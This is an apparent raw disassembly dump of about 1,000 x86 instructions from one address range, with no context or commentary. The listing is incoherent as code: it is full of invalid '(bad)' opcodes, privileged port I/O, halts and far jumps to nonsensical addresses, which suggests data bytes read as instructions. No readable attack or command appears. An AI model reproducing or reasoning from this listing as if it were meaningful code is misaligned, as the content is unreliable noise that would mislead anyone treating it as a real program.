  415c79:	sub    DWORD PTR [ebx],edi
  415c7b:	pusha  
  415c7c:	test   BYTE PTR [eax+0x742dec1b],ah
  415c82:	cmp    eax,0x8a74946a
  415c87:	nop
  415c88:	or     dl,BYTE PTR [edx+0x504c43b9]
  415c8e:	mov    al,ds:0x9c2d83ad
  415c93:	ss cmp ah,bl
  415c96:	and    eax,0xc811db9a
  415c9b:	jno    0x415cc0
  415c9d:	cli    
  415c9e:	sub    BYTE PTR [ecx-0x6b],ah
  415ca1:	cdq    
  415ca2:	adc    eax,eax
  415ca4:	lahf   
  415ca5:	pop    es
  415ca6:	bound  edi,QWORD PTR [ebp-0x7b3796a7]
  415cac:	mov    ebp,DWORD PTR [ecx]
  415cae:	add    eax,0xd4402976
  415cb3:	mov    eax,ds
  415cb5:	xchg   ebx,eax
  415cb6:	mov    edi,0xc9324486
  415cbb:	and    al,0x53
  415cbd:	mov    edx,DWORD PTR [ebx+0x1c5f023f]
  415cc3:	lods   eax,DWORD PTR ds:[esi]
  415cc4:	arpl   cx,si
  415cc6:	imul   esp,DWORD PTR ds:0xb76b709c,0x22
  415ccd:	lea    ebx,[ecx-0x5393ee29]
  415cd3:	mov    ch,0xc2
  415cd5:	test   al,0x53
  415cd7:	outs   dx,BYTE PTR ds:[esi]
  415cd8:	mov    ecx,0x400d517e
  415cdd:	ins    DWORD PTR es:[edi],dx
  415cde:	push   ebx
  415cdf:	sbb    al,0xe3
  415ce1:	add    eax,0x58fab4da
  415ce6:	and    eax,0xe81acf33
  415ceb:	pop    ebp
  415cec:	mov    edi,0xbeb2ec41
  415cf1:	pop    ebx
  415cf2:	xor    DWORD PTR [esi-0x79],edi
  415cf5:	int    0xda
  415cf7:	(bad)  
  415cf8:	sbb    esi,DWORD PTR [esi]
  415cfa:	adc    DWORD PTR [ecx+ebx*2],ecx
  415cfd:	sbb    eax,0x6b573ff9
  415d02:	xor    DWORD PTR [edx],0x3c
  415d05:	(bad)  
  415d06:	or     cl,BYTE PTR [esi]
  415d08:	or     ch,ah
  415d0a:	shl    BYTE PTR [ecx-0x5d],0xd2
  415d0e:	nop
  415d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d10:	dec    esi
  415d11:	leave  
  415d12:	mov    edx,0xc80d29de
  415d17:	push   ebx
  415d18:	(bad)  
  415d1a:	jbe    0x415d56
  415d1c:	test   bl,cl
  415d1e:	mov    ebp,0x68c8edae
  415d23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d24:	fsubp  st(0),st
  415d26:	pop    eax
  415d27:	into   
  415d28:	nop
  415d29:	push   eax
  415d2a:	mov    ah,ch
  415d2c:	mov    DWORD PTR [ebx+0x66],0xa42693b6
  415d33:	cmp    cl,BYTE PTR [edx*8-0x369f1ea4]
  415d3a:	cdq    
  415d3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d3c:	inc    edx
  415d3d:	out    dx,eax
  415d3e:	xchg   BYTE PTR [edi+0x182fa313],al
  415d44:	(bad)
  415d47:	dec    ebx
  415d48:	rcr    DWORD PTR [ecx+0x78374b07],0x7d
  415d4f:	jns    0x415d6a
  415d51:	xor    BYTE PTR [ecx],cl
  415d53:	fldcw  WORD PTR [ecx]
  415d55:	jbe    0x415dd5
  415d57:	inc    edi
  415d58:	cli    
  415d59:	fwait
  415d5a:	inc    edi
  415d5b:	ror    ebp,cl
  415d5d:	imul   edi,DWORD PTR [ecx-0x223e1bf3],0x5d367302
  415d67:	hlt    
  415d68:	(bad)  
  415d69:	jns    0x415d85
  415d6b:	fwait
  415d6c:	repnz inc edi
  415d6e:	push   edx
  415d6f:	inc    ebp
  415d70:	scas   al,BYTE PTR es:[edi]
  415d71:	adc    eax,ecx
  415d73:	mov    edx,0xcb851372
  415d78:	icebp  
  415d79:	and    DWORD PTR [esi+0x68],ecx
  415d7c:	rcl    BYTE PTR [ebx-0xd],cl
  415d7f:	mov    esi,0x999cac46
  415d84:	pushf  
  415d85:	mov    ?,WORD PTR [esi]
  415d87:	mov    ch,0xb2
  415d89:	shl    DWORD PTR [ecx-0x2031bfc8],0xb1
  415d90:	xchg   ebx,eax
  415d91:	jecxz  0x415d7b
  415d93:	push   ebp
  415d94:	mov    dh,0x39
  415d96:	xchg   ebp,eax
  415d97:	lahf   
  415d98:	in     eax,0x75
  415d9a:	lods   al,BYTE PTR ds:[esi]
  415d9b:	std    
  415d9c:	bound  ebx,QWORD PTR [edi-0x18]
  415d9f:	hlt    
  415da0:	out    dx,eax
  415da1:	fild   QWORD PTR [esi-0x784c7989]
  415da7:	jbe    0x415dd3
  415da9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415daa:	rol    DWORD PTR [ebp+0x45],0x5e
  415dae:	dec    edx
  415daf:	lods   al,BYTE PTR ds:[esi]
  415db0:	adc    al,0xef
  415db2:	inc    ebx
  415db3:	jg     0x415dd6
  415db5:	sbb    eax,0xdb29aa3a
  415dba:	fdiv   QWORD PTR [ecx-0x16]
  415dbd:	rcr    BYTE PTR [esi],0x4e
  415dc0:	ins    BYTE PTR es:[edi],dx
  415dc1:	imul   edx,DWORD PTR [ecx],0xffffffc2
  415dc4:	jl     0x415d78
  415dc6:	mov    dh,0xd1
  415dc8:	push   es
  415dc9:	test   al,0x92
  415dcb:	(bad)  
  415dcc:	nop
  415dcd:	in     eax,0x5a
  415dcf:	rol    DWORD PTR [esi],1
  415dd1:	jo     0x415e2b
  415dd3:	lods   eax,DWORD PTR ds:[esi]
  415dd4:	push   cs
  415dd5:	add    eax,DWORD PTR [edi]
  415dd7:	sbb    BYTE PTR [edi-0x62],dl
  415dda:	push   ecx
  415ddb:	pop    es
  415ddc:	shr    DWORD PTR [edx],0x69
  415ddf:	fwait
  415de0:	xor    al,0x82
  415de2:	and    ebp,esi
  415de4:	dec    edi
  415de5:	add    eax,0xc0f38dae
  415dea:	inc    ebp
  415deb:	jg     0x415da4
  415ded:	cwde   
  415dee:	ins    BYTE PTR es:[edi],dx
  415def:	arpl   WORD PTR [edx],dx
  415df1:	mov    ecx,0x51bfa8de
  415df6:	pop    edx
  415df7:	int3   
  415df8:	xchg   DWORD PTR [edx],ecx
  415dfa:	add    ah,bl
  415dfc:	inc    ebx
  415dfd:	pop    edi
  415dfe:	pushf  
  415dff:	jae    0x415e01
  415e01:	fdivr  DWORD PTR [ebx+0x3481ed2]
  415e07:	fadd   QWORD PTR [ecx]
  415e09:	xchg   edi,eax
  415e0a:	jb     0x415e3d
  415e0c:	or     DWORD PTR [eax+0x4a483d88],esi
  415e12:	jmp    0x475a248a
  415e17:	add    BYTE PTR [ebx-0x1b],ah
  415e1a:	push   eax
  415e1b:	test   al,0xe2
  415e1d:	stos   BYTE PTR es:[edi],al
  415e1e:	cld    
  415e1f:	lock shr DWORD PTR [edi+0x42],cl
  415e23:	(bad)  
  415e24:	cli    
  415e25:	add    DWORD PTR [eax+0x54],ebp
  415e28:	dec    edx
  415e29:	dec    ecx
  415e2a:	push   ebp
  415e2b:	mov    ch,0x8
  415e2d:	dec    edx
  415e2e:	and    bl,bl
  415e30:	xchg   cl,dh
  415e32:	and    BYTE PTR [ebx-0x79],0xeb
  415e36:	adc    al,0x6d
  415e38:	leave  
  415e39:	popa   
  415e3a:	xor    ch,BYTE PTR [edi]
  415e3c:	call   0x787d55c3
  415e41:	std    
  415e42:	cvtdq2ps xmm2,XMMWORD PTR [ebx]
  415e45:	cmc    
  415e46:	out    0xb,al
  415e48:	fldenv [ebp-0x6c]
  415e4b:	adc    DWORD PTR [edi+0x20],edx
  415e4e:	cmp    al,0xd
  415e50:	lock es gs ds and al,0xc8
  415e56:	and    DWORD PTR [ebp-0x38596c92],esi
  415e5c:	or     al,0x86
  415e5e:	jno    0x415e8a
  415e60:	cmp    al,0xeb
  415e62:	jno    0x415e45
  415e64:	lds    edi,FWORD PTR [esi]
  415e66:	je     0x415e31
  415e68:	ins    DWORD PTR es:[edi],dx
  415e69:	pushf  
  415e6a:	imul   esi,ebx,0x3e798494
  415e70:	mov    esp,esi
  415e72:	and    ah,BYTE PTR [ebp+ebp*2-0x75258cf7]
  415e79:	xor    bl,BYTE PTR [esi+0x1ef6c4ba]
  415e7f:	jo     0x415efc
  415e81:	test   DWORD PTR [ecx-0xd],ecx
  415e84:	mov    dl,0x4
  415e86:	stos   DWORD PTR es:[edi],eax
  415e87:	sbb    ah,ch
  415e89:	pop    ds
  415e8a:	add    ah,ch
  415e8c:	mov    al,ds:0x4906984d
  415e91:	add    eax,0x6ef1f7c
  415e96:	push   esi
  415e97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e98:	repz rcl BYTE PTR [ebx-0x4b8e2c73],1
  415e9f:	(bad)  
  415ea0:	jb     0x415e2f
  415ea2:	shl    esi,cl
  415ea4:	pop    esi
  415ea5:	mov    DWORD PTR [ebp+0x64034340],0x9250a458
  415eaf:	xor    ebp,DWORD PTR [edx+edx*2]
  415eb2:	mov    esi,0x4ed5d4
  415eb7:	mov    cl,0xed
  415eb9:	push   ecx
  415eba:	fidivr DWORD PTR [ebp+0x4b16d3df]
  415ec0:	arpl   WORD PTR [ecx-0x22],si
  415ec3:	xchg   ebx,eax
  415ec4:	adc    al,0xe
  415ec6:	adc    al,BYTE PTR [esi]
  415ec8:	ret    0xa77d
  415ecb:	enter  0x10c4,0x97
  415ecf:	pusha  
  415ed0:	sub    eax,0x9bb06f8a
  415ed5:	xchg   ebp,eax
  415ed6:	mov    esi,0x4fde204a
  415edb:	jnp    0x415efc
  415edd:	sub    DWORD PTR [ecx],edx
  415edf:	das    
  415ee0:	dec    edi
  415ee1:	inc    esi
  415ee2:	minps  xmm6,XMMWORD PTR [esi+ebp*1+0xa]
  415ee7:	push   es
  415ee8:	lods   eax,DWORD PTR ds:[esi]
  415ee9:	cdq    
  415eea:	mov    ds:0xb3b036aa,al
  415eef:	pushf  
  415ef0:	push   ecx
  415ef1:	shl    BYTE PTR [esp+ebx*4-0x43],0x56
  415ef6:	(bad)  
  415ef7:	jnp    0x415ed8
  415ef9:	xchg   ebx,eax
  415efa:	sub    DWORD PTR [esi+0x5f594138],ebx
  415f00:	mov    eax,0x9366a8c0
  415f05:	mov    ah,0xc7
  415f07:	in     eax,dx
  415f08:	pop    esp
  415f09:	sbb    DWORD PTR [ebx+0x6f],edx
  415f0c:	(bad)  
  415f0d:	ret    
  415f0e:	jge    0x415e9f
  415f10:	ja     0x415f6e
  415f12:	add    DWORD PTR [ebp+0x4f9b8069],edx
  415f18:	push   ecx
  415f19:	fist   DWORD PTR [eax]
  415f1b:	addr16 jb 0x415e9f
  415f1e:	cdq    
  415f1f:	int    0x4c
  415f21:	je     0x415efc
  415f23:	daa    
  415f24:	dec    ebx
  415f25:	sub    DWORD PTR [edi+0x6bdce8c5],esp
  415f2b:	retf   0xce1a
  415f2e:	xor    ah,0xfc
  415f31:	adc    eax,DWORD PTR [edx+ebp*1+0x399b30c2]
  415f38:	inc    eax
  415f39:	aam    0xb
  415f3b:	in     al,0xa3
  415f3d:	xor    BYTE PTR [esi-0x5e154b94],bh
  415f43:	xchg   ah,bl
  415f45:	inc    ebx
  415f46:	sti    
  415f47:	ret    0xf63f
  415f4a:	mov    ebp,0xcadc8397
  415f4f:	jbe    0x415f91
  415f51:	test   DWORD PTR [eax+0x5a939607],esp
  415f57:	pop    ebp
  415f58:	in     al,0x5c
  415f5a:	std    
  415f5b:	dec    edi
  415f5c:	out    dx,al
  415f5d:	idiv   DWORD PTR ds:0xb32871f5
  415f63:	ja     0x415f9a
  415f65:	icebp  
  415f66:	xchg   ebp,eax
  415f67:	fwait
  415f68:	sub    eax,0x728ee481
  415f6d:	adc    al,0x12
  415f6f:	pop    eax
  415f70:	dec    esp
  415f71:	hlt    
  415f72:	loopne 0x415fc3
  415f74:	pop    esp
  415f75:	call   FWORD PTR [edx-0x26b45499]
  415f7b:	xor    BYTE PTR [ebx],dh
  415f7d:	lock (bad) 
  415f7f:	xor    bh,ch
  415f81:	or     al,0x9f
  415f83:	stos   DWORD PTR es:[edi],eax
  415f84:	addr16 jb 0x415f8b
  415f87:	imul   esi,DWORD PTR [ecx],0xffffffea
  415f8a:	xchg   BYTE PTR [esi+eax*1-0x7cdaa727],ah
  415f91:	out    dx,al
  415f92:	add    DWORD PTR [ebx],ecx
  415f94:	daa    
  415f95:	jae    0x415f21
  415f97:	pop    ds
  415f98:	sbb    al,0x6d
  415f9a:	imul   edx,DWORD PTR [ebx+0x1d987e46],0x61f8c0bd
  415fa4:	add    BYTE PTR ds:0x3cde0d16,dl
  415faa:	mov    edi,0x9befe42f
  415faf:	repz clc 
  415fb1:	adc    eax,0x59e3a10f
  415fb6:	jbe    0x415f3f
  415fb8:	jmp    0x415f4f
  415fba:	push   esp
  415fbb:	push   edi
  415fbc:	cmp    eax,0x4dc0779f
  415fc1:	adc    eax,0xf7c34b41
  415fc6:	sti    
  415fc7:	dec    ecx
  415fc8:	pop    es
  415fc9:	lds    ebx,FWORD PTR [ebx]
  415fcb:	or     al,0x46
  415fcd:	pusha  
  415fce:	scas   al,BYTE PTR es:[edi]
  415fcf:	(bad)  
  415fd0:	mov    DWORD PTR gs:[ecx-0x16],edx
  415fd4:	push   cs
  415fd5:	cs pushf 
  415fd7:	cld    
  415fd8:	out    0x69,eax
  415fda:	or     eax,0x8b8b1b24
  415fdf:	sub    DWORD PTR [esi+0x55],ebp
  415fe2:	dec    edi
  415fe3:	imul   ebp,edx,0x4e
  415fe6:	mov    bh,0x43
  415fe8:	jle    0x415fb8
  415fea:	pop    ecx
  415feb:	fild   WORD PTR [esi]
  415fed:	rol    DWORD PTR [edx-0x2d245e15],0xa7
  415ff4:	ds pusha 
  415ff6:	adc    cl,ah
  415ff8:	pop    ds
  415ff9:	test   al,0x65
  415ffb:	mov    ds:0xbd6b4ce0,eax
  416000:	fld    TBYTE PTR [edx]
  416002:	lahf   
  416003:	js     0x416044
  416005:	ds push cs
  416007:	sub    BYTE PTR [ebp+0x7a],cl
  41600a:	or     al,0xb0
  41600c:	add    eax,0x5e73fab7
  416011:	pop    esi
  416012:	push   cs
  416013:	inc    ebx
  416014:	jnp    0x415fe7
  416016:	mov    esp,0xd8654dda
  41601b:	mov    ecx,0xd91cd073
  416020:	sub    dl,dl
  416022:	(bad)  
  416024:	int3   
  416025:	pop    eax
  416026:	jl     0x416017
  416028:	push   ss
  416029:	sub    DWORD PTR [ecx-0x67e6c04d],edx
  41602f:	xlat   BYTE PTR cs:[ebx]
  416031:	or     eax,0x5e722fa8
  416036:	nop
  416037:	(bad)
  41603a:	sub    dh,ah
  41603c:	sar    bh,1
  41603e:	repnz ss das 
  416041:	bound  eax,QWORD PTR [eax]
  416043:	das    
  416044:	jle    0x416020
  416046:	or     ebx,edi
  416048:	out    0x85,eax
  41604a:	pop    esp
  41604b:	sbb    ch,dl
  41604d:	test   BYTE PTR [eax],dh
  41604f:	jecxz  0x416039
  416051:	hlt    
  416052:	xor    dh,cl
  416054:	mov    esp,0x36e6c101
  416059:	jg     0x416046
  41605b:	imul   eax,DWORD PTR [ebp-0x4d],0xfffffff7
  41605f:	or     edx,ebx
  416061:	inc    esi
  416062:	cwde   
  416063:	test   BYTE PTR [edx],al
  416065:	push   0x16429584
  41606a:	pop    es
  41606b:	push   cs
  41606c:	pushf  
  41606d:	je     0x416008
  41606f:	push   esi
  416070:	das    
  416071:	jne    0x4160d8
  416073:	dec    esi
  416074:	in     eax,dx
  416075:	jmp    0xa80f:0xf118b7d2
  41607c:	fs pop edi
  41607e:	xor    edi,ecx
  416080:	or     DWORD PTR [eax],ebp
  416082:	push   0x6aa9552e
  416087:	mov    edx,0x444189bb
  41608c:	mov    ebx,0x924ae7dc
  416091:	dec    ecx
  416092:	push   cs
  416093:	cmp    dl,BYTE PTR [ebx-0x5efd4ae7]
  416099:	int    0x4f
  41609b:	hlt    
  41609c:	cwde   
  41609d:	xor    al,0x76
  41609f:	loope  0x4160dc
  4160a1:	inc    ebx
  4160a2:	jge    0x416044
  4160a4:	add    esp,edi
  4160a6:	(bad)  
  4160a7:	mov    ecx,0x827c197b
  4160ac:	xchg   esp,eax
  4160ad:	pop    edx
  4160ae:	stos   DWORD PTR es:[edi],eax
  4160af:	repz sbb ah,BYTE PTR [edi]
  4160b2:	mov    ds:0x142df74e,eax
  4160b7:	jp     0x41612b
  4160b9:	mov    dh,0xc1
  4160bb:	lods   al,BYTE PTR ds:[esi]
  4160bc:	push   0xb9b34e4e
  4160c1:	xchg   DWORD PTR [esi+0x7313841],ebx
  4160c7:	mov    eax,0xe6825c94
  4160cc:	int3   
  4160cd:	pop    ecx
  4160ce:	sbb    al,0xb2
  4160d0:	rol    DWORD PTR [eax-0x45],cl
  4160d3:	(bad)  
  4160d4:	loop   0x416107
  4160d6:	sbb    edx,DWORD PTR [ebx]
  4160d8:	outs   dx,DWORD PTR ds:[esi]
  4160d9:	idiv   DWORD PTR [ebx+0x62]
  4160dc:	jnp    0x4160e1
  4160de:	add    al,0xc4
  4160e0:	mov    dh,0x83
  4160e2:	ds (bad) 
  4160e4:	pop    esp
  4160e5:	test   BYTE PTR [eax-0x741c20a8],cl
  4160eb:	not    DWORD PTR [esi+0x0]
  4160ee:	push   eax
  4160ef:	lds    ecx,FWORD PTR [eax]
  4160f1:	and    BYTE PTR [ebx-0x4c8b8ae8],ah
  4160f7:	out    dx,eax
  4160f8:	inc    ebp
  4160f9:	leave  
  4160fa:	sbb    al,0xf7
  4160fc:	clc    
  4160fd:	je     0x4160bd
  4160ff:	clc    
  416100:	jne    0x4160fb
  416102:	push   edi
  416103:	addr16 dec esp
  416105:	xchg   esi,eax
  416106:	xchg   esp,eax
  416107:	les    eax,FWORD PTR [esi-0x25]
  41610a:	pop    ebp
  41610b:	sub    DWORD PTR [edx],edi
  41610d:	enter  0x537f,0x2f
  416111:	aaa    
  416112:	iret   
  416113:	cmp    ebx,DWORD PTR [edx+edi*8]
  416116:	ja     0x41612e
  416118:	mov    eax,DWORD PTR [edi]
  41611a:	pushf  
  41611b:	hlt    
  41611c:	nop
  41611d:	jns    0x41615a
  41611f:	clc    
  416120:	jmp    0x840429ab
  416125:	xchg   ebx,eax
  416126:	inc    esp
  416127:	and    esp,DWORD PTR [edi]
  416129:	cli    
  41612a:	mov    ecx,0x7bb81de4
  41612f:	push   eax
  416130:	xchg   ebx,eax
  416131:	xor    ebx,DWORD PTR [eax]
  416133:	mov    ah,0xf9
  416135:	into   
  416136:	sbb    al,0x88
  416138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416139:	mov    ecx,0x59d7a5eb
  41613e:	or     DWORD PTR [eax-0x2be4cd3c],ecx
  416144:	adc    al,0x15
  416146:	fistp  DWORD PTR [edx]
  416148:	les    esp,FWORD PTR [ebp+ebp*8+0x4d]
  41614c:	or     DWORD PTR [ebp-0x4f899fc8],0x86a1eb06
  416156:	mov    bl,0xe0
  416158:	data16 hlt 
  41615a:	push   esi
  41615b:	out    dx,al
  41615c:	out    0xff,eax
  41615e:	or     al,0x28
  416160:	pop    eax
  416161:	pop    esp
  416162:	js     0x4161b7
  416164:	cmp    al,0x7d
  416166:	cmp    BYTE PTR [ebp-0x1a2d181],bh
  41616c:	call   0xf7b:0xf94c5edb
  416173:	test   BYTE PTR [ebp-0x7c],0x41
  416177:	jmp    0xa45a8124
  41617c:	pop    ebx
  41617d:	mov    edi,0x631b3eaf
  416182:	adc    bl,BYTE PTR [edi+0x21]
  416185:	mov    dh,0x58
  416187:	retf   0xf27
  41618a:	int3   
  41618b:	outs   dx,DWORD PTR ds:[esi]
  41618c:	ror    BYTE PTR [ebp+0xd722a9f],cl
  416192:	push   0xe976a15b
  416197:	stos   BYTE PTR es:[edi],al
  416198:	mov    al,0xa0
  41619a:	out    0xba,eax
  41619c:	inc    edi
  41619d:	inc    ebp
  41619e:	addr16 in al,dx
  4161a0:	add    al,0x18
  4161a2:	loopne 0x41616f
  4161a4:	xchg   esi,eax
  4161a5:	ins    DWORD PTR es:[edi],dx
  4161a6:	jnp    0x416145
  4161a8:	dec    esp
  4161a9:	(bad)  
  4161ab:	sahf   
  4161ac:	inc    ecx
  4161ad:	push   0x3e
  4161af:	sub    al,0xfb
  4161b1:	jb     0x416138
  4161b3:	arpl   WORD PTR [ecx],cx
  4161b5:	or     BYTE PTR [edx-0xb05e477],ah
  4161bb:	and    al,0xf6
  4161be:	lock adc al,0x74
  4161c1:	iret   
  4161c2:	xchg   ebx,eax
  4161c3:	xchg   esi,eax
  4161c4:	lea    ecx,[eax+0x24ad0777]
  4161ca:	and    al,0x32
  4161cc:	pop    ebp
  4161cd:	pop    ds
  4161ce:	cmp    al,0x9c
  4161d0:	xchg   BYTE PTR [edx+0x3d3708fc],dh
  4161d6:	or     BYTE PTR [edx-0x1aa79aec],0x6a
  4161dd:	neg    DWORD PTR [ecx+edi*8-0x2e]
  4161e1:	fxch   st(0)
  4161e3:	cmp    dh,BYTE PTR [edi-0x73b2cac3]
  4161e9:	mov    ebx,0x6762f3bd
  4161ee:	in     al,dx
  4161ef:	leave  
  4161f0:	xchg   edx,eax
  4161f1:	nop
  4161f2:	sar    BYTE PTR [ebx+0x1b2d2010],cl
  4161f8:	imul   esi,DWORD PTR [eax+0x14],0xf964feb7
  4161ff:	pusha  
  416200:	adc    ah,bh
  416202:	jecxz  0x4161b6
  416204:	inc    ebx
  416205:	mov    eax,DWORD PTR [ebp+0x46c99a63]
  41620b:	inc    BYTE PTR [edi+ebp*4]
  41620e:	jmp    0x41621f
  416210:	dec    esi
  416211:	aam    0x27
  416213:	retf   
  416214:	mov    ah,0x62
  416216:	xchg   BYTE PTR [edi+0x68257e31],al
  41621c:	jp     0x416224
  41621e:	mov    BYTE PTR [ebp-0x72],dh
  416221:	inc    edi
  416222:	fcmovnbe st,st(1)
  416224:	push   0x1d
  416226:	pushf  
  416227:	ss cdq 
  416229:	test   al,0x9f
  41622b:	aam    0xc6
  41622d:	call   FWORD PTR [ebp+0x1a]
  416230:	not    DWORD PTR [edx-0x62]
  416233:	lahf   
  416234:	xchg   ebp,eax
  416235:	push   es
  416236:	add    DWORD PTR [esi-0x30],ebp
  416239:	pop    eax
  41623a:	pop    esp
  41623b:	jmp    0x4162ad
  41623d:	mov    al,0xcf
  41623f:	in     eax,dx
  416240:	mov    WORD PTR [ecx-0x310464b9],ds
  416246:	and    BYTE PTR [ecx],dh
  416248:	stos   BYTE PTR es:[edi],al
  416249:	rol    BYTE PTR fs:[ecx],0x6b
  41624d:	retf   0xaf3d
  416250:	imul   esi,DWORD PTR [edi-0x6e19a93],0xc658febe
  41625a:	out    0xe7,eax
  41625c:	xor    eax,0xac97b224
  416261:	inc    eax
  416262:	je     0x4162b3
  416264:	in     eax,0x45
  416266:	pop    esp
  416267:	cmc    
  416268:	adc    BYTE PTR [edi+0x5f],ch
  41626b:	retf   
  41626c:	jge    0x4162cb
  41626e:	icebp  
  41626f:	shr    DWORD PTR [ebx+0x46],cl
  416272:	mov    BYTE PTR [edx+0x27],ch
  416275:	icebp  
  416276:	jge    0x41623f
  416278:	repz mov edi,0x6d55bf7f
  41627e:	pushf  
  41627f:	mov    esi,0x820b9236
  416284:	cmp    bl,BYTE PTR [ebp-0x35]
  416287:	fs push ds
  416289:	push   ss
  41628a:	mov    bh,0x10
  41628c:	push   ecx
  41628d:	jecxz  0x4162f6
  41628f:	cmp    DWORD PTR [edi-0x4e233ea6],esi
  416295:	ins    BYTE PTR es:[edi],dx
  416296:	mov    bh,BYTE PTR [esi]
  416298:	push   fs
  41629a:	jp     0x41628f
  41629c:	push   eax
  41629d:	mov    ecx,0x53fd2936
  4162a2:	dec    esi
  4162a3:	push   0x78
  4162a5:	mov    esp,0xba195a31
  4162aa:	push   ds
  4162ab:	or     bl,bh
  4162ad:	pop    eax
  4162ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162af:	nop
  4162b0:	sub    bh,BYTE PTR [esi-0x6b8591bd]
  4162b6:	and    ecx,DWORD PTR [ebx-0x12]
  4162b9:	dec    esp
  4162ba:	mov    ecx,DWORD PTR [edi-0x4]
  4162bd:	pop    ebx
  4162be:	jecxz  0x416292
  4162c0:	cmovbe edi,DWORD PTR [ebp-0x1f]
  4162c4:	xchg   edi,eax
  4162c5:	call   0x7be4:0x492835f
  4162cc:	cmc    
  4162cd:	pop    edx
  4162ce:	not    BYTE PTR [edi]
  4162d0:	aad    0x72
  4162d2:	fs pop es
  4162d4:	psrlq  mm2,QWORD PTR [esi]
  4162d7:	or     eax,0x229871c
  4162dc:	sbb    dh,BYTE PTR [ebp-0x6e]
  4162df:	jp     0x416323
  4162e1:	call   0x8c7c:0x2197778a
  4162e8:	aas    
  4162e9:	das    
  4162ea:	ror    ecx,1
  4162ec:	lea    esp,[edi-0x21]
  4162ef:	pop    ss
  4162f0:	or     bh,bl
  4162f2:	adc    eax,0x16592df
  4162f7:	xor    al,0x3c
  4162f9:	int3   
  4162fa:	stos   DWORD PTR es:[edi],eax
  4162fb:	dec    edx
  4162fc:	ins    BYTE PTR es:[edi],dx
  4162fd:	xchg   edx,eax
  4162fe:	mov    eax,esp
  416300:	call   0xb9c91980
  416305:	push   ds
  416306:	call   DWORD PTR [eax+0xeb20697]
  41630c:	retf   0xded8
  41630f:	(bad)  
  416310:	adc    al,0x9c
  416312:	sar    bh,0x5
  416315:	(bad)  
  416317:	out    0xb6,eax
  416319:	jb     0x41638b
  41631b:	push   esi
  41631c:	cmc    
  41631d:	ror    BYTE PTR [edi],1
  41631f:	push   esi
  416320:	and    eax,DWORD PTR [eax+ecx*1-0x1d11ad3e]
  416327:	xchg   esp,eax
  416328:	ficomp WORD PTR [ebp+eax*8-0x7572d1cc]
  41632f:	into   
  416330:	inc    ecx
  416331:	push   ds
  416332:	aam    0x41
  416334:	(bad)  
  416335:	fldpi  
  416337:	aam    0xbd
  416339:	in     al,0x55
  41633b:	mov    al,ss:0xd89dea56
  416341:	(bad)  
  416342:	xchg   edx,eax
  416343:	adc    BYTE PTR [edx-0x56c9b5b0],al
  416349:	and    dh,BYTE PTR [ebx+0x339a42e0]
  41634f:	in     al,dx
  416350:	add    eax,0xf9b3c8d5
  416355:	or     esi,DWORD PTR [ebx-0x41d173c9]
  41635b:	aad    0x12
  41635d:	cmc    
  41635e:	mov    esp,0xfecf3f69
  416363:	mov    WORD PTR [edi+0x30a2d017],ss
  416369:	push   0xffffffee
  41636b:	xchg   edi,eax
  41636c:	pop    eax
  41636d:	in     eax,0xa3
  41636f:	inc    esp
  416370:	dec    esi
  416371:	push   ecx
  416372:	out    0x71,al
  416374:	push   cs
  416375:	push   cx
  416377:	aam    0x47
  416379:	push   eax
  41637a:	icebp  
  41637b:	fs mov eax,0x810e5a4c
  416381:	inc    ecx
  416382:	in     al,dx
  416383:	mov    ch,0x49
  416385:	nop
  416386:	mov    dl,0x28
  416388:	loope  0x41636f
  41638a:	addr16 (bad) 
  41638c:	call   0x7b8d5858
  416391:	popa   
  416392:	mov    ds:0x8a3a868c,al
  416397:	int3   
  416398:	jno    0x416405
  41639a:	fwait
  41639b:	mov    ch,0xef
  41639d:	test   al,ch
  41639f:	mov    ecx,0xf22c6aa4
  4163a4:	push   edx
  4163a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163a6:	sbb    eax,0x5601c256
  4163ab:	mov    edx,0x108a84dd
  4163b0:	jmp    0x46f9:0x8e790711
  4163b7:	sbb    DWORD PTR [edx],esp
  4163b9:	fwait
  4163ba:	mov    ah,0x1c
  4163bc:	mov    ebx,0xaad5e764
  4163c1:	sar    DWORD PTR [ebx+0x5d],1
  4163c4:	mov    ?,WORD PTR [esi-0x3e61c62d]
  4163ca:	and    DWORD PTR [ebp-0x32851ce7],ebx
  4163d0:	push   esp
  4163d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163d2:	xchg   ecx,eax
  4163d3:	rcr    dh,0x37
  4163d6:	clc    
  4163d7:	mov    bl,0x7f
  4163d9:	mov    al,0x7b
  4163db:	lds    edx,FWORD PTR [ecx]
  4163dd:	jmp    0x8db517d2
  4163e2:	loope  0x41645f
  4163e4:	lods   eax,DWORD PTR ds:[esi]
  4163e5:	jmp    0x4163f6
  4163e7:	ins    BYTE PTR es:[edi],dx
  4163e8:	repz repnz mov bh,0xc2
  4163ec:	sub    edi,DWORD PTR [eax+0x6de5dbbf]
  4163f2:	ins    DWORD PTR es:[edi],dx
  4163f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163f4:	imul   eax,DWORD PTR [eax+0x2f],0xffffffe7
  4163f8:	jo     0x41645e
  4163fa:	push   ds
  4163fb:	or     eax,0x440c776d
  416400:	cmp    esi,eax
  416402:	push   ecx
  416403:	bnd ret 
  416405:	xlat   BYTE PTR ds:[ebx]
  416406:	cli    
  416407:	push   edi
  416408:	add    eax,DWORD PTR [edx-0x57745851]
  41640e:	out    dx,al
  41640f:	mov    bl,0x2d
  416411:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416413:	mov    eax,ds:0xe4b883fd
  416418:	mov    eax,0xc696968
  41641d:	jmp    0x416472
  41641f:	mov    WORD PTR [edx+0x5a],?
  416422:	pop    edx
  416423:	jno    0x416427
  416425:	rcl    edi,0x78
  416428:	in     eax,0x60
  41642a:	add    BYTE PTR fs:[esi],dl
  41642d:	js     0x41644c
  41642f:	and    ebp,DWORD PTR [esi]
  416431:	jmp    0x51639188
  416436:	sbb    esp,ebx
  416438:	adc    eax,0x3a45a79
  41643d:	sbb    DWORD PTR [ebx],ebx
  41643f:	test   eax,esp
  416441:	mov    bl,0xe9
  416443:	push   0xed55a056
